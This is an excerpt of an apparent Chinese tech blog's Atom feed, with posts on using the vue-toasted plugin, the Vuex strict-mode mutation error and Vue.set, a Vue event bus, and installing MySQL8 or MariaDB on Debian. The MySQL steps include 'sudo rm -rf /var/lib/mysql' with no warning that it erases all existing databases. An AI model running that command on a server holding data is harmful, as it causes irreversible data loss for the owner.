    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>Vue toast组件使用及其配置</title>
    <link href="https://seniortesting.club/posts/629MZRBNVm/"/>
    <id>https://seniortesting.club/posts/629MZRBNVm/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="插件推荐"><a href="#插件推荐" class="headerlink" title="插件推荐"></a>插件推荐</h2><p>推荐一个特别好的插件： <a href="https://github.com/shakee93/vue-toasted" target="_blank" rel="noopener">vue-toasted</a></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h4 id="Install-using-npm"><a href="#Install-using-npm" class="headerlink" title="Install using npm"></a>Install using npm</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install it via npm</span></span><br><span class="line">npm install vue-toasted --save</span><br></pre></td></tr></table></figure><h4 id="Install-using-yarn"><a href="#Install-using-yarn" class="headerlink" title="Install using yarn"></a>Install using yarn</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install it via yarn</span></span><br><span class="line">yarn add vue-toasted</span><br></pre></td></tr></table></figure><h4 id="Direct-usage-with-html"><a href="#Direct-usage-with-html" class="headerlink" title="Direct usage with html"></a>Direct usage with html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Insert the vue core before vue-toasted --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue-toasted&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    Vue.use(Toasted)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>It is simple. couple of lines all what you need.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// register the plugin on vue</span></span><br><span class="line"><span class="keyword">import</span> Toasted <span class="keyword">from</span> <span class="string">&#x27;vue-toasted&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(Toasted)</span><br><span class="line"></span><br><span class="line"><span class="comment">// you can also pass options, check options reference below</span></span><br><span class="line">Vue.use(Toasted, Options)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// you can call like this in your component</span></span><br><span class="line"><span class="built_in">this</span>.$toasted.show(<span class="string">&#x27;hello billo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// and also</span></span><br><span class="line">Vue.toasted.show(<span class="string">&#x27;hola billo&#x27;</span>);</span><br></pre></td></tr></table></figure><p>All Good Now you have this cool toast in your project..</p><h3 id="Icons-fire"><a href="#Icons-fire" class="headerlink" title="Icons :fire"></a>Icons :fire</h3><p><a href="http://google.github.io/material-design-icons/" target="_blank" rel="noopener">Material Icons</a>, <a href="http://fontawesome.io/cheatsheet/" target="_blank" rel="noopener">Fontawesome</a> and <a href="https://materialdesignicons.com/" target="_blank" rel="noopener">Material Design Icons</a> are supported. you will have to import the icon packs into your project. <a href="/examples/using-icons.js"> example using icons </a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// pass the icon name as string</span></span><br><span class="line">    icon : <span class="string">&#x27;check&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// or you can pass an object</span></span><br><span class="line">    icon : &#123;</span><br><span class="line">        name : <span class="string">&#x27;watch&#x27;</span>,</span><br><span class="line">        after : <span class="literal">true</span> <span class="comment">// this will append the icon to the end of content</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Actions-fire"><a href="#Actions-fire" class="headerlink" title="Actions  :fire"></a>Actions  :fire</h3><p align="center">    <a href="https://github.com/shakee93/vue-toasted" target="_blank">    <img width="300" src="https://shakee93.github.io/vue-toasted/assets/images/action-preview.jpg">    </a></p><p>You can have single or multiple actions in the toast. take a look at the example below</p><p>Check below Vue Router section for router integration</p><table><thead><tr><th><strong>Parameters</strong></th><th><strong>Type’s</strong></th><th><strong>Default</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>text*</td><td>String</td><td>-</td><td>name of action</td></tr><tr><td>href</td><td>String</td><td><code>null</code></td><td>url of action</td></tr><tr><td>icon</td><td>String</td><td><code>null</code></td><td>name of material for action</td></tr><tr><td>target</td><td>String</td><td><code>null</code></td><td>target of url</td></tr><tr><td>class</td><td>String/Array</td><td><code>null</code></td><td>custom css class for the action</td></tr><tr><td>push</td><td>Object</td><td><code>null</code></td><td>Vue Router push parameters</td></tr><tr><td>onClick</td><td>Function(e,toastObject)</td><td><code>null</code></td><td>onClick Function of action</td></tr></tbody></table><h5 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// you can pass a single action as below</span></span><br><span class="line">    action : &#123;</span><br><span class="line">        text : <span class="string">&#x27;Cancel&#x27;</span>,</span><br><span class="line">        onClick : <span class="function">(<span class="params">e, toastObject</span>) =&gt;</span> &#123;</span><br><span class="line">            toastObject.goAway(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// you can pass a multiple actions as an array of actions</span></span><br><span class="line">    action : [</span><br><span class="line">        &#123;</span><br><span class="line">            text : <span class="string">&#x27;Cancel&#x27;</span>,</span><br><span class="line">            onClick : <span class="function">(<span class="params">e, toastObject</span>) =&gt;</span> &#123;</span><br><span class="line">                toastObject.goAway(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            text : <span class="string">&#x27;Undo&#x27;</span>,</span><br><span class="line">            <span class="comment">// router navigation</span></span><br><span class="line">            push : &#123; </span><br><span class="line">             name : <span class="string">&#x27;somewhere&#x27;</span>,</span><br><span class="line">             <span class="comment">// this will prevent toast from closing</span></span><br><span class="line">             dontClose : <span class="literal">true</span></span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h3><p>below are the options you can pass to create a toast</p><table><thead><tr><th><strong>Option</strong></th><th><strong>Type’s</strong></th><th><strong>Default</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>position</td><td>String</td><td>‘top-right’</td><td>Position of the toast container <br> <strong>[‘top-right’, ‘top-center’, ‘top-left’, ‘bottom-right’, ‘bottom-center’, ‘bottom-left’]</strong></td></tr><tr><td>duration</td><td>Number</td><td>null</td><td>Display time of the toast in millisecond</td></tr><tr><td>keepOnHover</td><td>Boolean</td><td>false</td><td>When mouse is over a toast’s element, the corresponding <code>duration</code> timer is paused until the cursor leaves the element</td></tr><tr><td>action</td><td>Object, Array</td><td>null</td><td>Add single or multiple actions to toast  <a href="#actions--fire">explained here</a></td></tr><tr><td>fullWidth</td><td>Boolean</td><td>false</td><td>Enable Full Width</td></tr><tr><td>fitToScreen</td><td>Boolean</td><td>false</td><td>Fits to Screen on Full Width</td></tr><tr><td>className</td><td>String, Array</td><td>null</td><td>Custom css class name of the toast</td></tr><tr><td>containerClass</td><td>String, Array</td><td>null</td><td>Custom css classes for toast container</td></tr><tr><td>iconPack</td><td>String</td><td>‘material’</td><td>Icon pack type to be used <br> <strong>[‘material’, ‘fontawesome’, ‘mdi’, ‘custom-class’, ‘callback’]</strong></td></tr><tr><td>Icon</td><td>String, Object</td><td>null</td><td>Material icon name as string.  <a href="#icons-fire">explained here</a></td></tr><tr><td>type</td><td>String</td><td>‘default’</td><td>Type of the Toast  <strong>[‘success’, ‘info’, ‘error’]</strong></td></tr><tr><td>theme</td><td>String</td><td>‘toasted-primary’</td><td>Theme of the toast you prefer<br> <strong>[‘toasted-primary’, ‘outline’, ‘bubble’]</strong></td></tr><tr><td>onComplete</td><td>Function</td><td>null</td><td>Trigger when toast is completed</td></tr><tr><td>closeOnSwipe</td><td>Boolean</td><td>true</td><td>Closes the toast when the user swipes it</td></tr><tr><td>singleton</td><td>Boolean</td><td>false</td><td>Only allows one toast at a time.</td></tr></tbody></table><h3 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h3><p>Methods available on Toasted…</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// you can pass string or html to message</span></span><br><span class="line">Vue.toasted.show( <span class="string">&#x27;my message&#x27;</span>, &#123; <span class="comment">/* some option */</span> &#125;)</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>Method</strong></th><th><strong>Parameter’s</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>show</td><td>message, options</td><td>show a toast with default style</td></tr><tr><td>success</td><td>message, options</td><td>show a toast with success style</td></tr><tr><td>info</td><td>message, options</td><td>show a toast with info style</td></tr><tr><td>error</td><td>message, options</td><td>show a toast with error style</td></tr><tr><td>register</td><td>name, message, options</td><td>register your own toast with options <a href="#custom-toast-registration">explained here</a></td></tr><tr><td>clear</td><td>-</td><td>clear all toasts</td></tr></tbody></table><h3 id="Toast-Object"><a href="#Toast-Object" class="headerlink" title="Toast Object"></a>Toast Object</h3><p>Each Toast Returns a Toast Object where you can manipulate the toast.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// html element of the toast</span></span><br><span class="line">el : HtmlElement</span><br><span class="line"></span><br><span class="line"><span class="comment">// change text or html of the toast</span></span><br><span class="line">text : <span class="built_in">Function</span>(text)</span><br><span class="line"></span><br><span class="line"><span class="comment">// fadeAway the toast. default delay will be 800ms</span></span><br><span class="line">goAway : <span class="built_in">Function</span>(delay = <span class="number">800</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>using the toast object</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myToast = <span class="built_in">this</span>.$toasted.show(<span class="string">&quot;Holla !!&quot;</span>);</span><br><span class="line">myToast.text(<span class="string">&quot;Changing the text !!!&quot;</span>).goAway(<span class="number">1500</span>);</span><br></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>如何配置右侧一个关闭图标？</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> action: [</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">// 此处用的是fontawesome5图标</span></span><br><span class="line">            icon: <span class="string">&#x27;times-circle&#x27;</span>,</span><br><span class="line">            onClick: <span class="function">(<span class="params">e, toastObject</span>) =&gt;</span> &#123;</span><br><span class="line">              toastObject.goAway(<span class="number">0</span>)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ol start="2"><li>如何配置一个全局可直接重复调用的toast？</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> register: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 使用方法：this.$toast.global.app_error();</span></span><br><span class="line">          name: <span class="string">&#x27;app_error&#x27;</span>,</span><br><span class="line">          message: <span class="string">&#x27;Oops...Something went wrong&#x27;</span>,</span><br><span class="line">          options: &#123;</span><br><span class="line">            type: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            icon: &#123;</span><br><span class="line">              name: <span class="string">&#x27;exclamation-triangle&#x27;</span>,</span><br><span class="line">              after: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            action: [</span><br><span class="line">              &#123;</span><br><span class="line">                icon: <span class="string">&#x27;times-circle&#x27;</span>,</span><br><span class="line">                onClick: <span class="function">(<span class="params">e, toastObject</span>) =&gt;</span> &#123;</span><br><span class="line">                  toastObject.goAway(<span class="number">0</span>)</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line"><span class="comment">// 然后nuxt中直接如下调用：</span></span><br><span class="line"><span class="built_in">this</span>.$toast.global.app_error();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;插件推荐&quot;&gt;&lt;a href=&quot;#插件推荐&quot; class=&quot;headerlink&quot; title=&quot;插件推荐&quot;&gt;&lt;/a&gt;插件推荐&lt;/h2&gt;&lt;p&gt;推荐一个特别好的插件： &lt;a href=&quot;https://github.com/shakee93/vue-toasted&quot; </summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="javascript" scheme="https://seniortesting.club/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Vuex Do not mutate vuex store state outside mutation handlers</title>
    <link href="https://seniortesting.club/posts/cmgAEndLE6/"/>
    <id>https://seniortesting.club/posts/cmgAEndLE6/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="报错：-Do-not-mutate-vuex-store-state-outside-mutation-handlers"><a href="#报错：-Do-not-mutate-vuex-store-state-outside-mutation-handlers" class="headerlink" title="报错： Do not mutate vuex store state outside mutation handlers"></a>报错： Do not mutate vuex store state outside mutation handlers</h2><p>直接引用vuex中的getter属性，然后放在<code>v-model</code>的时候，如果有更新会设置vuex的getter属性，而在vuex的<strong>strict mode</strong>下就会报上面的错误。</p><p>推荐参考： <a href="http://shzhangji.com/blog/2018/04/17/form-handling-in-vuex-strict-mode/" target="_blank" rel="noopener">http://shzhangji.com/blog/2018/04/17/form-handling-in-vuex-strict-mode/</a></p><p>两种解决方式：<br>一种是了解到v-model是一个语法糖，所以设置了v-model后设置下对应的input和change事件，然后在事件里面调用vuex的action进行更新，而不是组件里面的v-model自动的更新。</p><p>一种是使用：<a href="https://github.com/maoberlehner/vuex-map-fields" target="_blank" rel="noopener">vuex-map-fields</a> 可以实现vuex的双向绑定。</p><h2 id="Vue-set-向响应式对象中添加响应式属性，及设置数组元素触发视图更新"><a href="#Vue-set-向响应式对象中添加响应式属性，及设置数组元素触发视图更新" class="headerlink" title="Vue.set 向响应式对象中添加响应式属性，及设置数组元素触发视图更新"></a>Vue.set 向响应式对象中添加响应式属性，及设置数组元素触发视图更新</h2><p>一、为什么需要使用Vue.set？</p><p>　　vue中不能检测到数组和对象的两种变化：</p><p>　　1、数组长度的变化 vm.arr.length = 4</p><p>　　2、<strong>数组通过索引值修改内容 vm.arr[1] = ‘aa’</strong></p><p>　　Vue.$set(target,key,value)：可以动态的给数组、对象添加和修改数据，并更新视图中数据的显示。</p><p>　　vue在构造函数new Vue()时，就通过Object.defineProperty中的getter和setter 这两个方法，完成了对数据的绑定。所以直接通过vm.arr[1] = ‘aa’的方法，无法修改值去触发vue中视图的更新，必须还得通过Object.defineProperty的方法去改变，而Vue.$set（）就封装了js底层的Object.defineProperty方法。</p><p>　　所以我们需要利用Vue.set() 响应式新增与修改数据。</p><p>二、Vue.set使用</p><p>　　Vue不能检测到对象属性的添加或删除。</p><p>　　由于Vue会在初始化实例时对属性执行getter/setter转化过程，所以属性必须在data对象上存在才能让Vue转换它，这样才能是响应式的。例如：</p><p>所以注意两点：</p><ol><li>对于数据中某一个数组的修改，需要使用Vue.set，或者$set， 这个数组数据可以是<strong>data属性</strong>或者是<strong>vuex中的state属性</strong>。例如修改数组this.array[1]这种方式是不起作用的。</li><li>对于数据中的某一个对象的属性添加或者删除，</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;报错：-Do-not-mutate-vuex-store-state-outside-mutation-handlers&quot;&gt;&lt;a href=&quot;#报错：-Do-not-mutate-vuex-store-state-outside-mutation-handlers</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>Vue $on,$emit 父子组件不同组件时间通信</title>
    <link href="https://seniortesting.club/posts/zeRqr61UtB/"/>
    <id>https://seniortesting.club/posts/zeRqr61UtB/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="父子组件通信"><a href="#父子组件通信" class="headerlink" title="父子组件通信"></a>父子组件通信</h2><h2 id="不同组件通信"><a href="#不同组件通信" class="headerlink" title="不同组件通信"></a>不同组件通信</h2><h3 id="单组件通用使用"><a href="#单组件通用使用" class="headerlink" title="单组件通用使用"></a>单组件通用使用</h3><h3 id="全局vue实例使用"><a href="#全局vue实例使用" class="headerlink" title="全局vue实例使用"></a>全局vue实例使用</h3><ol><li>在vue的入口main.js中定义<code>$eventHub</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype.$eventHub = Vue.prototype.$eventHub || <span class="keyword">new</span> Vue()</span><br></pre></td></tr></table></figure><ol start="2"><li>然后在vue的组件的生命周期函数中声明监听的事件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeCreated</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="built_in">this</span>.$eventHub.$on(<span class="string">&#x27;eventName&#x27;</span>,callback)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"> <span class="built_in">this</span>.$eventHub.$on(<span class="string">&#x27;eventName&#x27;</span>,callback)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;父子组件通信&quot;&gt;&lt;a href=&quot;#父子组件通信&quot; class=&quot;headerlink&quot; title=&quot;父子组件通信&quot;&gt;&lt;/a&gt;父子组件通信&lt;/h2&gt;&lt;h2 id=&quot;不同组件通信&quot;&gt;&lt;a href=&quot;#不同组件通信&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>nuxt技巧和问题整理</title>
    <link href="https://seniortesting.club/posts/xd1LEJLaZF/"/>
    <id>https://seniortesting.club/posts/xd1LEJLaZF/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    <category term="Nuxtjs" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/Nuxtjs/"/>
    
    
  </entry>
  
  <entry>
    <title>Debian MYSQL8安装及其环境配置</title>
    <link href="https://seniortesting.club/posts/EDWn0A8mzl/"/>
    <id>https://seniortesting.club/posts/EDWn0A8mzl/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装步骤如下命令"><a href="#安装步骤如下命令" class="headerlink" title="安装步骤如下命令"></a>安装步骤如下命令</h2><p>::: warning mysql安装密码问题</p><ol><li>安装的时候注意选择legecal password,否则wordpress不能访问mysql8数据库</li><li>如果是raspberry,则必须安装mariadb<br>:::</li></ol><h2 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h2><p> <strong>1. mysql8安装，注意配置大小写安装</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install lsb-release</span><br><span class="line">$ wget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;mysql-apt-config_0.8.13-1_all.deb</span><br><span class="line">$ sudo dpkg -i mysql-apt-config*</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install mysql-server mysql-common</span><br><span class="line">&#x2F;&#x2F; 配置数据库表大小写敏感配置</span><br><span class="line">$ sudo systemctl stop mysql.service</span><br><span class="line">$ sudo rm -rf &#x2F;var&#x2F;lib&#x2F;mysql</span><br><span class="line">$ 此处需要执行命令: &#96;sudo nano &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#96;,添加下方的配置: &#96; lower_case_table_names &#x3D; 1&#96;</span><br><span class="line">$ sudo systemctl start mysql.service</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2. mariadb安装</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install mariadb-server</span><br><span class="line">sudo systemctl status mariadb</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="mysqld-cnf配置参数"><a href="#mysqld-cnf配置参数" class="headerlink" title="mysqld.cnf配置参数"></a>mysqld.cnf配置参数</h2><p><strong>1. mysql配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p><strong>2. mariadb配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;etc&#x2F;mysql&#x2F;mariadb.conf.d&#x2F;50-server.cnf</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>修改以上的配置文件,注意一定要在<code>mysqld</code>区域放入以下的配置信息:</strong></p><ol><li><code>**master**</code>主数据库写数据&lt;通用配置&gt;:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 